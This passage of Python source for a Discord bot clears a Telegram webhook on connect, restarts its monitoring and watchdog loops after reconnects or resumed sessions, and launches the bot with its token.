            await sess.get(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/deleteWebhook?drop_pending_updates=true")
            log.info("Telegram webhook cleared")
    except Exception as e:
        log.error(f"Failed to clear Telegram webhook: {e}")
    if not monitor_loop.is_running():
        monitor_loop.start()
        log.info(f"Monitor started — checking every {CHECK_INTERVAL}s")
    else:
        log.info("Monitor already running after reconnect")
    if not watchdog.is_running():
        watchdog.start()

@bot.event
async def on_resumed():
    log.info("Discord session resumed")
    if not monitor_loop.is_running():
        monitor_loop.start()
        log.info("Monitor restarted after resume")
    if not watchdog.is_running():
        watchdog.start()

# ─── RUN ─────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    bot.run(DISCORD_TOKEN, log_handler=None)
